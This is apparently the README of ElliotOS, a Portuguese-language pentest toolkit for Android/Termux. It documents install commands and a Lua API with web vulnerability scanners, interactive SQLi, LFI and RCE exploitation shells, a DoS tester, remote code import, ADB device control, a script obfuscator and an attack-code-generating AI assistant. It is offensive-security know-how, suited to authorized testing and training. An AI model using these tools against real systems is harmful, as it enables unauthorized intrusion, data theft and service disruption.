<div align="center">

```
  _____ _ _ _       _    ___  ____
 | ____| | (_) ___ | |_ / _ \/ ___|
 | |_  | | | |/ _ \| __| | | \___ \
 | |___| | | | (_) | |_| |_| |___) |
 |_____|_|_|_|\___/ \__|\___/____/

 Pentest System  //  Android / Termux  //  No Root
```

**O primeiro sistema de pentest nativo para Android — sem root, no bolso.**

[![Plataforma](https://img.shields.io/badge/Plataforma-Android%20%2F%20Termux-green?style=flat-square)](https://github.com/mikeelliot218/ElliotOS)
[![Root](https://img.shields.io/badge/Root-NÃO%20necessário-brightgreen?style=flat-square)](#)
[![Linguagem](https://img.shields.io/badge/Lua%205.4%20%2B%20C%20puro-blue?style=flat-square)](#)
[![Licença](https://img.shields.io/badge/Licença-MIT-lightgrey?style=flat-square)](#licença)
[![Gratuito](https://img.shields.io/badge/Gratuito-100%25-orange?style=flat-square)](#)

</div>

---

## O que é o ElliotOS?

O ElliotOS é um sistema operacional de segurança e pentest construído **dentro do Termux**, o emulador de terminal do Android. Desenvolvido por **Mike Elliot**, nasceu de uma necessidade real: não existia nenhum toolkit de pentest funcional para Android.

Kali Linux, Black Arch, Parrot OS — todos exigem PC. O ElliotOS roda no bolso, direto do celular, **sem root, sem VM, sem frescura**.

Tudo é compilado e instalado via um único script (`luascript.sh`), que constrói do zero:
- Um interpretador Lua 5.4.8 customizado com extensões de rede (`lua-net`)
- Uma biblioteca C com módulos de segurança embutidos (`libnet.so`)
- Uma IA nativa chamada **CYN**, integrada diretamente ao binário
- Ferramentas próprias: `ms`, `lpm`, `xpm`, `cxx`, `ee`, `xtun`

---

## Plataformas suportadas

O instalador detecta o ambiente automaticamente (padrão: Termux) ou pode ser forçado via flag:

| Ambiente | Flag | Gerenciador |
|----------|------|-------------|
| Android / Termux | `--termux` (padrão) | `pkg` |
| Debian / Ubuntu | `--debian` ou `--ubuntu` | `apt` |
| Arch Linux | `--arch` | `pacman` |
| Fedora / RHEL | `--fedora` | `dnf` |

### Arquiteturas suportadas

| Arquitetura | Flags de compilação |
|-------------|---------------------|
| aarch64 / arm64 | `-O2 -march=armv8-a` |
| armv7 / armv8 | `-O2 -march=armv7-a -mfpu=neon` |
| armv6 | `-O2 -march=armv6 -mfpu=vfp` |
| x86_64 | `-O2` |
| i686 / i386 | `-O2 -m32` |
| riscv64 | `-O2` |

---

## Instalação

> **Requisito:** Android com [Termux via F-Droid](https://f-droid.org/packages/com.termux/) — não use a versão da Play Store, está desatualizada.

### Verificação de compatibilidade (Preflight)

Antes de instalar qualquer coisa, o script verifica automaticamente:

| Item | Mínimo | Recomendado |
|------|--------|-------------|
| Bash | 4+ | qualquer >= 4 |
| Android SDK | 21 (Android 5) | 28 (Android 9+) |
| Termux | 0.118 | F-Droid mais recente |
| Espaço livre | 100 MB | 200 MB+ |
| Compilador | gcc (fallback) | clang |
| RAM | 2 GB | 4 GB+ |

---

### Mínimo — só o ElliotOS

Sistema, REPL `ms`, ferramentas de rede e pentest. Sem editor, sem GUI.

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh
```

---

### Com editor — ElliotOS + ElliotOS Editor

Tudo do modo mínimo + editor de texto nativo (`ms -e`).

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh -e
```

---

### Com GUI — ElliotOS + XFCE4 (Termux:X11)

Tudo do modo mínimo + ambiente gráfico XFCE4. Sem editor.

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh --gui
```

---

### Full — ElliotOS + Editor + GUI

Instalação completa: sistema + editor + XFCE4.

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh -e --gui
```

---

### Atualizar — já tem o ElliotOS instalado?

Recompila o binário e atualiza os scripts sem reinstalar dependências.

```bash
pkg update -y && pkg install -y git wget curl clang
git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh --update
```

---

### Desinstalar

```bash
# Remove apenas o ElliotOS (mantém clang, curl, openssl...)
bash luascript.sh -u

# Remove ElliotOS + todas as dependências do sistema
bash luascript.sh -ua
```

---

### Diagnóstico pós-instalação

```bash
bash luascript.sh --doctor
```

Verifica o estado da instalação atual e reporta problemas sem recompilar nada.

---

### Todas as flags do instalador

```
bash luascript.sh [ambiente] [opções]
```

| Flag | Descrição |
|------|-----------|
| `--termux` | Ambiente Android/Termux (padrão) |
| `--debian` / `--ubuntu` | Ambiente Debian ou Ubuntu (apt) |
| `--arch` | Ambiente Arch Linux (pacman) |
| `--fedora` | Ambiente Fedora / RHEL (dnf) |
| `-e` / `--editor` | Instala o editor MoonStyle (ee) |
| `--gui` | Instala XFCE4 via Termux:X11 |
| `--update` | Recompila binário e atualiza scripts (sem reinstalar deps) |
| `--doctor` | Diagnóstico da instalação atual |
| `-u` / `--uninstall` | Desinstala o ElliotOS (deps mantidas) |
| `-ua` / `--uninstall-all` | Desinstala tudo, inclusive dependências |
| `-sq` | Output verbose da compilação (sem barra de progresso) |
| `-h` / `--help` | Exibe ajuda completa |

> A instalação compila tudo do zero e leva cerca de **15 a 20 minutos** dependendo do dispositivo. Nenhuma etapa exige root.

---

### Dependências instaladas automaticamente

**Termux:** `wget`, `timg`, `which`, `binutils`, `git`, `make`, `cmake`, `build-essential`, `clang`, `figlet`, `tree`, `readline`, `curl`, `libcurl`, `libssh2`, `openssl`, `openssl-tool`, `autoconf`, `whois`, `ncurses`, `nmap`, `file`, `libsqlite`, `sqlite`, `nodejs`, `tgpt`

**Debian/Ubuntu:** `build-essential`, `clang`, `wget`, `git`, `make`, `cmake`, `libreadline-dev`, `libcurl4-openssl-dev`, `libssl-dev`, `libncurses-dev`, `figlet`, `whois`, `curl`, `nmap`, `file`, `libsqlite3-dev`, `sqlite3`, `nodejs`, `tgpt`

**Arch:** `base-devel`, `clang`, `wget`, `git`, `cmake`, `readline`, `curl`, `openssl`, `ncurses`, `figlet`, `whois`, `nmap`, `file`, `sqlite`, `nodejs`, `tgpt`

**Fedora:** `gcc`, `clang`, `make`, `cmake`, `wget`, `git`, `readline-devel`, `libcurl-devel`, `openssl-devel`, `ncurses-devel`, `figlet`, `whois`, `curl`, `nmap`, `file`, `sqlite-devel`, `sqlite`, `nodejs`, `tgpt`

---

## Ferramentas incluídas

### Binários nativos (compilados em C)

| Comando | Descrição |
|---------|-----------|
| `ms` | MoonStyle — REPL interativo Lua 5.4 com extensões de rede |
| `lua-net` | Interpretador Lua com módulos de segurança embutidos |
| `luar` | Lua 5.4 raw (alias do interpretador sem extensões de pentest) |
| `lpm` | Gerenciador de pacotes Lua (instala módulos .lua e exploits) |
| `xpm` | Gerenciador de ferramentas de pentest (instala ferramentas sem root) |
| `cxx` | Compilador C/C++ simplificado para o ambiente ElliotOS |
| `ee` | Editor de texto nativo em C, leve e rápido |
| `xtun` | Tunnel Toolkit — túneis TCP/UDP sem root |

---

## CYN — IA nativa

```
ms -a
```

A CYN é a inteligência artificial integrada diretamente no ElliotOS. Ela conhece todos os módulos, flags, funções e a arquitetura do sistema. Responde sempre em português, é técnica, objetiva e focada em segurança.

O backend usa `tgpt`. Providers disponíveis:

| Provider | Gratuito | Modelo padrão |
|----------|----------|---------------|
| `sky` | ✓ (recomendado) | gpt-4.1-mini |
| `pollinations` | ✓ | — |
| `isou` | ✓ | — |
| `ollama` | ✓ (local) | — |
| `koboldai` | ✓ | — |
| `groq` | requer key | llama-3.3-70b-versatile |
| `openai` | requer key | — |
| `gemini` | requer key | — |
| `deepseek` | requer key | — |

Configuração via REPL:
```lua
ai.provider('sky')                             -- sem chave (recomendado)
ai.provider('groq','llama-3.3-70b-versatile')  -- requer ai.key()
ai.key('sua-chave-aqui')
ai.model('gemma27')
ai.clear()   -- limpa histórico
```

Para uma chave gratuita do Gemini: [aistudio.google.com](https://aistudio.google.com)

---

## ms — Referência de flags

**Geral**
```bash
ms                            # REPL interativo
ms -c 'codigo lua'            # executa Lua sem abrir REPL
ms -f script.lua              # executa arquivo
ms -e                         # abre ElliotOS Editor (arquivo novo)
ms -e arquivo                 # abre/cria arquivo no ElliotOS Editor
ms -e arquivo -v erros.txt    # abre editor + verifica sintaxe (lua, sh, c, py, js)
ms -lua2c arquivo.lua         # transpila Lua → C (gera arquivo.c)
ms -lua2c -r arquivo.lua      # transpila e compila com cxx
ms -i                         # info do sistema
ms -v                         # versão
ms -h                         # ajuda completa
```

**IA (CYN)**
```bash
ms -a                         # chat interativo com a CYN
ms -a 'pergunta'              # pergunta direta
ms -A 'pergunta'              # resposta raw sem formatação
ms -a -f arq 'pergunta'       # passa arquivo como contexto para a CYN
ms --search 'query'           # pesquisa na web via DuckDuckGo e resume
ms --code [-o arq] 'tarefa'   # gera código/script (-o salva no arquivo)
```

**Rede**
```bash
ms -g url                     # HTTP GET
ms --post url dados           # HTTP POST
ms --headers url              # headers da resposta
ms --ip                       # IP público
ms -d host                    # DNS lookup
ms -P host                    # ping
ms --scan host p1 p2          # port scan (SYN sem root)
ms --listen porta             # listener TCP
ms --socket fam type h p      # fire-and-forget socket
ms -web arquivo porta         # sobe servidor HTTP estático local
ms -web stop                  # para o servidor web
```

**Pentest**
```bash
ms -x url [N]                 # XSS
ms -q url [N]                 # SQLi
ms -l url [N]                 # LFI
ms -r url [N]                 # RCE
ms -N url                     # NoSQL Injection
ms --ssrf url [N]             # SSRF
ms --redir url [N]            # Open Redirect
ms --ssti url [N]             # SSTI
ms --scan-all url [N]         # todos os scanners + spider integrado
ms --exploit-rce url          # exploit.rce REPL interativo
ms --exploit-sqli url         # exploit.sqli REPL interativo
ms --exploit-lfi url          # exploit.lfi REPL interativo
ms -p easy|med|hard           # sobe lab vulnerável local
ms -p stop                    # encerra todos os labs
ms --logs                     # exibe log de vulnerabilidades encontradas
ms --logs-clear               # limpa o log
```

> `N` = número de endpoints a testar (padrão: 1; 0 = todos)

**Diagnóstico**
```bash
ms -t                         # self-test
ms -tv                        # self-test verbose
ms -T                         # stress test (ms.force)
ms -Tv                        # stress test verbose
```

**APK**
```bash
ms --apk app.apk [app2.apk ...]  # testa compatibilidade e instalabilidade
ms --apk-sign app.apk            # alinha e assina um APK já compilado
appforge build <dir> [opções]    # converte HTML/CSS/JS em APK sem root
```

**Distros Linux (proot)**
```bash
ms -ba                        # instala Arch Linux ARM + repositório BlackArch
```

> **BlackArch:** funciona apenas em modo CLI. Interface gráfica não é suportada em proot.

**Crypto**
```bash
ms --md5 'texto'              # hash MD5
ms --sha256 'texto'           # hash SHA256
ms --b64e 'texto'             # Base64 encode
ms --b64d 'b64'               # Base64 decode
ms --jwt 'token'              # decodifica JWT
```

**Filesystem**
```bash
ms --cat arquivo              # lê e imprime arquivo
ms --ls [dir]                 # lista diretório
ms --write arq texto          # escreve arquivo
```

**Shell / Sistema**
```bash
ms --sh 'cmd'                 # executa shell e captura output
ms --ps                       # lista processos
ms --kill pid                 # mata processo
ms --env [VAR]                # variáveis de ambiente
```

**Scripts**
```bash
ms --script nome              # executa script Lua ou C do diretório de scripts
ms --script nome -- [args]    # com argumentos
ms --cscript nome.c           # compila e executa script C
ms --cscript binario          # executa binário C já compilado

# Exemplos:
ms --script recon -- alvo.com
ms --script portscan -- 192.168.1.1 1 9999 32
ms --script webcheck -- https://alvo.com
ms --script nexus -- --recon 192.168.1.1 -p 22,80,443
```

**Aprender / Documentação**
```bash
ms --learn                    # tutorial completo: 35 lições em 5 trilhas
ms --examples                 # lista scripts de exemplo instalados
ms --doc                      # documentação completa do ElliotOS
ms --doc modulos              # referência de todos os módulos
ms --doc net                  # net.* (HTTP, TCP, UDP, DNS, sockets)
ms --doc mod                  # mod.* (scanners de pentest)
ms --doc crypto               # crypto.* (hash, AES, JWT, encoding)
ms --doc sys                  # sys.* (threads, processos, env)
ms --doc fs                   # fs.* (arquivos e diretórios)
ms --doc ai                   # ai.* (CYN — chat, code, search)
ms --doc db                   # db.* (SQLite embutido)
ms --doc web                  # web.* (parsing HTML, servidor)
ms --doc dow                  # dow.* (download de mídia)
ms --doc lmod                 # lmod.* (módulos custom)
ms --doc adb                  # adb.* (Android Debug Bridge)
ms --doc pent                 # pent.* (lab vulnerável local)
ms --doc sh                   # sh.* (shell direto)
ms --doc cc                   # cc.* (compilador C inline)
ms --doc ui                   # ui.* (interface de terminal)
ms --doc tui                  # tui.* (UI interativo)
ms --doc exploit              # exploit.* (REPLs de pós-exploração)
ms --doc ell                  # ell.* (encoder/decoder de scripts)
ms --doc agent                # agent.* (agente autônomo)
ms --doc ivar                 # ivar.* (variáveis indexadas)
ms --doc string               # extensões string.*
ms --doc util                 # stdlib funcional util.*
ms --doc json                 # json.*
```

---

## Comandos especiais do REPL

Os comandos abaixo **não são funções Lua** — não precisam de `()`. São interceptados pelo preprocessador antes do parser Lua os ver. Funcionam também como função (`clear()`, `help()`) para compatibilidade.

| Comando | Descrição |
|---------|-----------|
| `help` | Exibe a documentação (equivalente a `ms --doc`) |
| `help <modulo>` | Doc de um módulo: `help net`, `help util`, `help exploit`... |
| `clear` | Limpa a tela de verdade via terminfo (sem scroll residual) |
| `cls` | Alias de `clear` |
| `cd <dir>` | Muda o diretório de trabalho do REPL |
| `cd ~` | Volta para o diretório home |
| `exit` / `q` | Sai do REPL |

---

## Módulos da API (globais no REPL — nunca use `require()`)

Todos os módulos abaixo são objetos globais disponíveis automaticamente no REPL e em qualquer script executado com `ms`. Usar `require()` neles causa erro fatal.

---

### `net.*` — Rede

```lua
net.get(url [,{headers,timeout,proxy}])            -- HTTP GET → {code, body, headers}
net.geth(url [,opts])                              -- GET retornando só os headers
net.post(url, body [,opts])                        -- HTTP POST
net.fetch(url [,opts])                             -- alias de get com controle fino
net.import(url)                                    -- baixa e executa Lua remoto → true/false
net.tcp(host, port)                                -- socket TCP OO → obj:send/:recv/:close/:lines
net.tcp6(host, port)                               -- socket TCP IPv6
net.udp(host, port)                                -- socket UDP
net.connect(host, port)                            -- alias de tcp
net.listen(port, fn)                               -- servidor TCP
net.socket(fam, type, host, port, timeout, payload)-- socket raw fire-and-forget
net.socketex(fam, type, host, port [,t])           -- socket OO; type='syn' → SYN probe sem root
net.scan(host, p1, p2 [,threads])                  -- port scan SYN sem root → {port, status, ms, open}
net.ping(host)                                     -- retorna latência em ms ou nil
net.dns(host)                                      -- DNS lookup → tabela de IPs
net.os(host)                                       -- OS fingerprint sem root → {os, ttl, confidence}
net.ip()                                           -- hosts ativos na rede local (auto-detecta subnet)
net.ip('192.168.1')                                -- scan da subnet especificada
net.ip('cidr', sec)                                -- com timeout em segundos (padrão: 1s, max: 5s)
net.send(fd, data)                                 -- envia dados por fd
net.recv(fd [,size])                               -- recebe dados por fd
net.close(fd)                                      -- fecha conexão por fd
net.help()                                         -- ajuda do módulo
```

**Objeto socket (retornado por `net.tcp`, `net.socketex`):**
```lua
s:send(data)         s:sendall(data)     s:sendto(data, host, port)
s:recv([size])       s:recvall()         s:recvline()
s:recvfrom()         s:peek([size])      s:lines()
s:wait([timeout])    s:bind(host, port)  s:accept()
s:shutdown([how])    s:settimeout(ms)    s:setsockopt(level, opt, val)
s:getsockopt(level, opt)                 s:local()
s:peer()             s:fd()              s:closed()
s:close()            s:info()
```

---

### `mod.*` — Pentest (scanners)

```lua
mod.xss(url [,n])         -- XSS reflected/stored/DOM/blind
mod.sqli(url [,n])        -- SQLi: error-based, boolean, time-based, UNION
mod.nosql(url [,n])       -- NoSQL: GET operators + POST JSON, boolean diff
mod.lfi(url [,n])         -- LFI / Path Traversal
mod.rce(url [,n])         -- Remote Code Execution
mod.ssrf(url [,n])        -- SSRF
mod.ssti(url [,n])        -- Server-Side Template Injection
mod.redir(url [,n])       -- Open Redirect
mod.cors(url)             -- CORS misconfiguration
mod.csrf(url)             -- CSRF
mod.jwt(token)            -- JWT: none attack, weak secret, decode
mod.idor(url [,param])    -- IDOR
mod.xxe(url)              -- XXE
mod.prototype(url)        -- Prototype Pollution
mod.headers(url)          -- analisa security headers → score
mod.waf(url)              -- detecta WAF e tecnologia
mod.recon(host)           -- recon: ping, DNS, OS fingerprint, banner
mod.info(url)             -- info tecnológica: server, powered-by, forms
mod.scan(url)             -- scan rápido de múltiplas vulns
mod.spider(url [,limit])  -- crawler com detecção de WAF → {all, forms, inputs}
mod.dirs(url)             -- bruteforce de diretórios e arquivos
mod.backup(url)           -- arquivos de backup expostos (.bak, .old, .zip...)
mod.secrets(url)          -- secrets vazados (API keys, tokens, credenciais)
mod.params(url)           -- descobre parâmetros ocultos
mod.subdomains(domain)    -- enumeração de subdomínios
mod.fuzz(url [,opts])     -- fuzzing genérico de parâmetros
mod.dos(url [,opts])      -- teste de negação de serviço
mod.auth(url)             -- testa autenticação fraca / bypass
mod.graphql(url)          -- auditoria de endpoint GraphQL
mod.ws(url)               -- teste de WebSocket
mod.crlf(url)             -- CRLF injection
mod.open_redirect(url)    -- Open Redirect (alias de mod.redir)
mod.git(url)              -- detecta .git exposto
mod.chain(url)            -- pipeline automático: spider + classifica + aplica scanners
mod.payload(tipo)         -- gera payloads para um tipo de vuln
mod.help()                -- ajuda do módulo
```

> `n` = número de endpoints a testar (padrão: 1; 0 = todos)

---

### `exploit.*` — REPLs de pós-exploração interativa

REPLs interativos para exploração passo a passo. Cada REPL aceita payloads em loop até você sair (`Ctrl+C` ou `q`). **Use apenas em ambientes autorizados (lab / CTF).**

```lua
exploit.sqli(url)   -- REPL de SQL Injection — extrai dados linha a linha
exploit.xss(url)    -- REPL de XSS — injeta e verifica reflexão de payload
exploit.lfi(url)    -- REPL de LFI — lê arquivos via path traversal
exploit.rce(url)    -- REPL de RCE — shell interativo via execução remota
exploit.ssti(url)   -- REPL de SSTI — injeta templates (Jinja2, Twig...)
exploit.idor(url)   -- REPL de IDOR — fuzzing de IDs para acesso não autorizado
exploit.help()      -- ajuda do módulo
```

---

### `sys.*` — Sistema e threads

```lua
sys.info()              -- info completo: CPU, RAM, deps, env
sys.thread(fn)          -- lança thread Lua isolada → tid
sys.join(tid [,ms])     -- aguarda thread terminar → valor retornado
sys.spawn(cmd)          -- executa comando em processo filho → PID
sys.sh(cmd)             -- executa via /bin/sh em thread separada
sys.list()              -- lista tasks ativas (threads + processos)
sys.kill(id)            -- encerra task pelo ID
sys.env(var)            -- lê variável de ambiente
sys.env(var, val)       -- seta variável de ambiente
sys.env()               -- retorna tabela com todas as variáveis
sys.pid()               -- PID do processo atual
sys.sleep(s)            -- pausa em segundos (float aceito)
sys.time()              -- epoch em segundos
sys.time_ms()           -- epoch em milissegundos
sys.exit(n)             -- encerra com código de saída
sys.mutex()             -- cria mutex → obj:lock()/:unlock()/:try()/:destroy()
sys.channel()           -- cria canal → obj:send()/:recv()/:close()/:fd_r()/:fd_w()
sys.net()               -- info de rede: interfaces, bytes rx/tx, loopback
sys.storage()           -- info de armazenamento: total, usado, livre
sys.logo()              -- exibe logo ASCII do ElliotOS
sys.help()              -- ajuda do módulo
```

---

### `crypto.*` — Criptografia (OpenSSL)

```lua
crypto.md5(s)               -- hash MD5 → hex string
crypto.sha1(s)              -- hash SHA1 → hex string
crypto.sha256(s)            -- hash SHA256 → hex string
crypto.sha512(s)            -- hash SHA512 → hex string
crypto.hmac(key, data [,algo]) -- HMAC (padrão: SHA256) → hex string
crypto.aes_enc(key, data)   -- AES-256-CBC encrypt → base64
crypto.aes_dec(key, data)   -- AES-256-CBC decrypt → plaintext
crypto.b64enc(s)            -- Base64 encode
crypto.b64dec(s)            -- Base64 decode
crypto.hexenc(s)            -- hex encode (bytes → hex string)
crypto.hexdec(s)            -- hex decode (hex string → bytes)
crypto.rand(n)              -- n bytes aleatórios (criptograficamente seguros)
crypto.help()               -- ajuda do módulo
```

---

### `fs.*` — Filesystem

```lua
fs.read(path)           -- lê arquivo → string ou nil, err
fs.write(path, data)    -- escreve arquivo (cria se não existir)
fs.append(path, data)   -- adiciona ao final do arquivo
fs.exists(path)         -- boolean
fs.mkdir(path)          -- cria diretório (incluindo pais)
fs.rm(path)             -- remove arquivo ou diretório
fs.move(src, dst)       -- move/renomeia arquivo
fs.copy(src, dst)       -- copia arquivo
fs.stat(path)           -- {size, mtime, ctime, mode, isdir, isfile, islink}
fs.isdir(path)          -- boolean
fs.isfile(path)         -- boolean
fs.chmod(path, mode)    -- muda permissões (mode em octal, ex: 0755)
fs.list(dir)            -- lista diretório → tabela de nomes
fs.glob(pattern)        -- glob → tabela de caminhos (ex: fs.glob('*.lua'))
fs.help()               -- ajuda do módulo
```

---

### `db.*` — SQLite3 embutido

```lua
db.open(path)           -- abre/cria banco SQLite3
db.close()              -- fecha o banco atual
db.exec(sql)            -- executa DDL/DML sem retorno (CREATE, INSERT, UPDATE, DELETE)
db.query(sql)           -- SELECT → tabela Lua [{col=val,...}, ...]
db.tables()             -- lista tabelas do banco atual
db.help()               -- ajuda do módulo
```

**Exemplo:**
```lua
db.open('scan.db')
db.exec('CREATE TABLE IF NOT EXISTS vulns (host TEXT, tipo TEXT, url TEXT)')
db.exec("INSERT INTO vulns VALUES ('alvo.com','xss','/search')")
local rows = db.query('SELECT * FROM vulns')
for _, r in ipairs(rows) do print(r.host, r.tipo, r.url) end
db.close()
```

---

### `ai.*` — Interface com a CYN

```lua
ai.ask(msg)                     -- pergunta para a CYN (com histórico)
ai.code(tarefa)                 -- gera código técnico otimizado
ai.search(query)                -- pesquisa na web e resume
ai.model(nome)                  -- troca modelo (flash, pro, gemma27...)
ai.models_code()                -- lista modelos disponíveis para código
ai.key(chave)                   -- define API key para o provider atual
ai.provider(nome [,modelo])     -- troca provider (sky, groq, gemini, openai...)
ai.list([modo])                 -- lista providers e modelos disponíveis
ai.add(nome, url, modelo)       -- adiciona provider customizado
ai.remove(nome)                 -- remove provider
ai.raw_mode(bool)               -- ativa/desativa output raw (sem markdown)
ai.history()                    -- exibe histórico da conversa atual
ai.forget()                     -- remove última troca do histórico
ai.clear()                      -- limpa todo o histórico de conversa
ai.help()                       -- ajuda do módulo
```

---

### `web.*` — Parsing HTML e servidor web

```lua
web.get(url [,opts])         -- baixa HTML/CSS/JS, segue redirects, UA browser
                              -- opts: {timeout, ua, quiet, headers, file}
                              -- → html, code  ou  nil, errmsg
web.save(url, path [,opts])  -- baixa e salva em arquivo
web.links(html)              -- extrai href de <a>/<link> e src de <img>/<script> → tabela
web.forms(html)              -- extrai <form> com action, method, inputs → tabela
web.scripts(html)            -- extrai <script> externos e inline → tabela
web.serve(path, port [,opts])-- sobe servidor HTTP estático em background
web.stop()                   -- para o servidor iniciado por web.serve()
web.help()                   -- ajuda do módulo
```

---

### `dow.*` — Download de mídia

Motor híbrido: YouTube usa `yt-dlp`; outros sites usam Cobalt API + wget. Todos os arquivos são salvos em `~/Downloads/`.

```lua
dow.video(url)      -- baixa vídeo (YouTube → yt-dlp, outros → Cobalt API)
dow.audio(url)      -- extrai apenas o áudio do vídeo
dow.imagen(url)     -- baixa imagem via URL direta com wget
dow.playlist(url)   -- baixa playlist completa do YouTube via yt-dlp
dow.info(url)       -- status das ferramentas e instância Cobalt em uso
dow.reset()         -- troca instância Cobalt em cache (útil se a atual falhar)
dow.help()          -- ajuda do módulo
```

> YouTube requer: `pkg install python-yt-dlp`

---

### `sh.*` — Shell direto

```lua
sh.exec(cmd)      -- executa comando e retorna stdout como string
sh.read(cmd)      -- alias de exec
sh.capture(cmd)   -- alias de exec (usado internamente pelo ms --sh)
sh.help()         -- ajuda do módulo
```

> Para capturar stderr: `sh.exec('comando 2>&1')`

---

### `pent.*` — Lab local vulnerável

Sobe um servidor HTTP vulnerável localmente para praticar pentest.

```lua
pent.start(level, port) -- sobe lab (level: 'easy', 'med' ou 'hard')
pent.stop()             -- para todos os labs
pent.status()           -- status dos labs rodando
pent.list()             -- lista labs disponíveis com descrição
pent.help()             -- ajuda do módulo
```

Portas padrão: `8081` (easy), `8082` (med), `8083` (hard).

Endpoints disponíveis: `/search`, `/login`, `/xss`, `/comment`, `/dom`, `/exec`, `/file`, `/path`, `/note`, `/tpl`, `/upload`, `/api/users`, `/api/me`, `/api/users/login`, `/api/products`, `/api/search`, `/redirect`, `/cors`, `/csrf`, `/jwt`, `/xxe`, `/admin`, `/register`, `/reset`, `/debug`, `/backup`, `/ssrf`, `/serialize`, `/rate`, `/headers`

Flags de exemplo: `FLAG{easy_sqli_win}`, `FLAG{nosql_auth_bypass}`, `FLAG{jwt_none_attack}`, `FLAG{lfi_found_you}`, `FLAG{ssrf_internal_fetch}`

---

### `lmod.*` — Criador de módulos Lua

```lua
lmod.new('nome' [, tipo])  -- cria módulo em ~/.lua-modules/nome.lua
                            -- tipos: scanner | recon | util | generic (padrão)
lmod.mod('arquivo.lua')    -- copia/registra arquivo Lua existente como módulo
lmod.list()                -- lista módulos instalados em ~/.lua-modules
lmod.remove('nome')        -- remove módulo pelo nome
lmod.path()                -- mostra o diretório de módulos
lmod.help()                -- ajuda com exemplos de uso
```

Módulos criados com `lmod` são carregados via `require('nome')` nos scripts.

**Tipos de template:**

| Tipo | Descrição |
|------|-----------|
| `scanner` | Template com `scan(url)` + detecção de vuln |
| `recon` | Template com `run(host)` para reconhecimento |
| `util` | Template utilitário genérico com helpers |
| `generic` | Módulo vazio, estrutura mínima |

---

### `cc.*` — Compilador C inline e transpilador Lua → C

```lua
cc.run(codigo_c)        -- compila e executa código C direto do REPL
cc.lua2c(arquivo_lua)   -- transpila arquivo Lua para C (gera arquivo.c)
cc.help()               -- ajuda do módulo
```

O transpilador `cc.lua2c` cobre Lua 5.4: funções named/locais/anônimas, retorno múltiplo, tabelas como arrays C, inferência de tipo (`int`/`double`/`char[]`/`const char*`), e forward declarations automáticas.

```lua
-- Exemplo cc.run:
cc.run([[
  #include <stdio.h>
  int main() { printf("ola do C!\n"); return 0; }
]])

-- Via linha de comando:
-- ms -lua2c arquivo.lua       → gera arquivo.c
-- ms -lua2c -r arquivo.lua    → transpila e compila com cxx
```

---

### `adb.*` — Android Debug Bridge via Wi-Fi

Usa o binário `adb` do Termux. Funciona sem root via protocolo ADB over TCP.

> **Requisito:** `pkg install android-tools`

```lua
-- Conexão
adb.pair('ip:porta', 'codigo')      -- pareia via Wi-Fi (Android 11+)
                                     -- código em: Config → Desenvolvedor → Pareamento por código
adb.connect('ip:porta')             -- conecta ao dispositivo após pareamento
adb.disconnect()                    -- desconecta
adb.devices()                       -- lista dispositivos conectados
adb.status()                        -- status da conexão ADB

-- Shell e arquivos
adb.shell('cmd')                    -- executa comando como ADB shell
adb.repl()                          -- shell ADB interativo
adb.push('local', 'remoto')         -- copia arquivo para o device
adb.pull('remoto', 'local')         -- copia arquivo do device
adb.install('app.apk')              -- instala APK no device
adb.uninstall('com.pkg.id')         -- desinstala app
adb.logcat([filtro])                -- lê logcat (opcional: filtro de tag)

-- Controle do device
adb.tap(x, y)                       -- simula toque na tela
adb.swipe(x1, y1, x2, y2)          -- simula gesto de swipe
adb.keyevent(code)                  -- envia evento de tecla (ex: 3 = HOME, 4 = BACK)
adb.text('texto')                   -- digita texto via ADB
adb.screenshot()                    -- captura tela → salva em ~/Downloads/
adb.reboot(['recovery'|'fastboot']) -- reinicia o device

-- Informações do sistema
adb.prop()                          -- lista propriedades do sistema (getprop)
adb.wifi()                          -- info de Wi-Fi
adb.screen_size()                   -- resolução da tela
adb.screen_density()                -- densidade da tela (DPI)
adb.screen_info()                   -- info completa da tela
adb.screen_reset()                  -- restaura resolução e densidade originais
adb.overscan(t, r, b, l)           -- ajusta overscan da tela
adb.game_mode(bool)                 -- ativa/desativa modo game
adb.forward(lport, rport)           -- port forwarding device → host
adb.setup()                         -- configura ambiente ADB

adb.help()                          -- ajuda do módulo
```

**Fluxo típico (Android 11+):**
```lua
adb.pair('192.168.1.5:37123', '654321')  -- pareia
adb.connect('192.168.1.5:5555')          -- conecta
adb.shell('id')                           -- verifica acesso
adb.screenshot()                          -- captura tela
adb.tap(540, 960)                         -- toca no centro
```

---

### `ui.*` — Interface de terminal

```lua
ui.color(code, texto)  -- texto colorido (código ANSI)
                        -- ex: ui.color('1;32', 'OK') → verde bold
ui.box(texto)          -- desenha caixa ao redor do texto
ui.clear()             -- limpa a tela
ui.sleep(s)            -- pausa em segundos
ui.fig(texto)          -- ASCII art via figlet
ui.input([prompt])     -- lê linha do usuário → string
ui.help()              -- ajuda do módulo
```

**Códigos de cor comuns:**

| Código | Resultado |
|--------|-----------|
| `1;32` | Verde bold |
| `1;31` | Vermelho bold |
| `1;33` | Amarelo bold |
| `1;36` | Ciano bold |
| `1;35` | Magenta bold |
| `0;90` | Cinza dim |

---

### `tui.*` — Framework de UI de terminal interativo

```lua
tui.main()        -- inicia loop principal de UI (bloqueante)
tui.func(fn)      -- registra função de callback (chamada a cada iteração)
tui.close()       -- encerra o loop de UI
tui.read()        -- lê evento de teclado raw
tui.help()        -- ajuda do módulo
```

**Exemplo completo:**
```lua
tui.func(function()
  ui.clear()
  ui.fig('Menu')
  local op = ui.input('Escolha [1-3, q]: ')
  if op == '1' then
    print(net.get('https://ifconfig.me'))
  elseif op == '2' then
    mod.headers('https://alvo.com')
  elseif op == 'q' then
    tui.close()
  end
end)
tui.main()
```

---

### `ell.*` — Encoder/Decoder de scripts

Codifica scripts Lua/Python/C/Bash/JS em formato `.ell` (3 camadas de ofuscação). Útil para distribuir scripts sem expor o código-fonte.

```lua
ell.encode('script.lua')            -- gera script.ell
ell.encode('script.py', 'python')   -- força linguagem explícita
ell.encode('script.lua', nil, 'saida.ell') -- especifica arquivo de saída
ell.decode('script.ell')            -- restaura o arquivo original
